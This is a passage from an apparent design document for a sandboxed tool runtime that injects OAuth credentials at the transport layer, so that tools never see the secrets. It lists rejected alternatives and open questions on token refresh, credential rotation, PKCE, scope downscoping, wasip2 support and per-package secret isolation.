**Why rejected:** Violates the core security requirement. If the tool can read the credential, it can exfiltrate it. The entire point is that the tool never sees the credential.

### 4. Sidecar Token Service

A separate localhost HTTP service that tools call to get tokens (e.g., `GET http://localhost:PORT/token/google_workspace`).

**Why rejected:** The tool receives the token and can exfiltrate it. Same problem as credential files. Also adds complexity — now we have three network services (proxy, token service, and the actual API).

### 5. Per-Request Credential Injection at `invoke` Level

Instead of the transport layer, `invoke` pre-computes all credentials and passes them to the runtime.

**Why rejected:** `invoke` would need to know which URLs the tool will call before execution — impossible for dynamic tools. The transport layer is the right place because it sees each outbound request as it happens.

## Open Questions

### 1. Token Endpoint Exemption

When the `CredentialInjector` performs a token refresh, it POSTs to `https://oauth2.googleapis.com/token`. This request should NOT go through the proxy or have credentials injected (it IS the credential request). The injector makes this call directly using its own `http.Client`, bypassing the proxy. Is this sufficient, or do we need a more formal "transport-internal request" concept?

### 2. Credential Rotation

If an operator rotates a `client_secret` in the secret store while a toolbox session is running, should the `CredentialInjector` pick up the new secret on the next token refresh? The current design reads secrets lazily and caches the refresh token — we'd need a TTL or signal-based invalidation. For v1, re-reading from the store on every refresh attempt (not on every request) is probably good enough.

### 3. OAuth2 PKCE

For public clients (no client_secret), OAuth2 PKCE (Proof Key for Code Exchange) should be supported. The `toolbox auth` flow should use PKCE by default when the credential declaration omits `client_secret`. This is a detail of the auth CLI command, not the injection architecture.

### 4. Scope Escalation

A package declares `admin.directory.user.readonly` scopes, but the stored refresh token might have broader scopes (from a previous authorization with more permissions). Should the transport layer downscope the token? Google supports the `scope` parameter in refresh requests to narrow the access token's scopes. This could be a future enhancement.

### 5. `wasip2` Tools

The current WASM runtime is WASIX-based. `wasip2` (WASI Preview 2) has its own networking model (`wasi:http`). When we support `wasip2` tools, the proxy approach may need adaptation — `wasi:http` uses a component model with explicit request/response types rather than raw sockets. The injector could potentially hook into the `wasi:http` handler directly, similar to the host fetch approach. This is a future concern.

### 6. Credential Declaration Validation

At package publish time, should we validate that credential declarations are consistent? For example: a package declares `inject.hosts: ["*.googleapis.com"]` but no tool in the package actually calls googleapis.com (detectable via static analysis of `fetch()` calls and `exec()` arguments). This would be a packaging lint, not a runtime check.

### 7. Shared Credentials Across Packages

Two packages in the same toolset might both need Google credentials (e.g., `google-workspace` and `google-calendar`). Under the current design they are **isolated by default** — each package's secrets are prefixed by its own fully qualified module name, so even identical credential `name` values resolve to different secret store keys. `acme.dev/google-workspace/client_id` and `acme.dev/google-calendar/client_id` are separate entries. This prevents accidental secret leakage between packages.

For cases where sharing IS desired (e.g., a single Google OAuth credential used by multiple packages), a future **toolset-level override** will allow explicit cross-package secret aliasing. This is deferred — the isolated-by-default posture is the right starting point.
